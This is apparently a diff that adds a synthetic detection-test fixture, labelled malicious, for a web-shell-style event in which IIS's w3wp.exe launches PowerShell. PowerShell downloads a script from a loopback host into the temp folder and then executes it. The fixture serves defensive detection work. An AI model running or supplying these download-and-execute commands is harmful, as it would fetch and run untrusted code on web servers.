@@ -1,0 +1,25 @@
+{
+  "label": "malicious",
+  "variant": "w3wp -> powershell IWR + Temp exec",
+  "source": "synthetic",
+  "expect_alert": true,
+  "result": "not run",
+  "synthetic": true,
+  "EventCode": 1,
+  "events": [
+    {
+      "ParentImage": "C:\\\\Windows\\\\System32\\\\inetsrv\\\\w3wp.exe",
+      "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+      "CommandLine": "powershell.exe -c Invoke-WebRequest http://127.0.0.1/a.ps1 -OutFile $env:TEMP\\\\a.ps1",
+      "User": "IIS APPPOOL\\\\Site",
+      "host": "iis2"
+    },
+    {
+      "ParentImage": "C:\\\\Windows\\\\System32\\\\inetsrv\\\\w3wp.exe",
+      "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+      "CommandLine": "powershell.exe -c & $env:TEMP\\\\a.ps1",
+      "User": "IIS APPPOOL\\\\Site",
+      "host": "iis2"
+    }
+  ]
+}
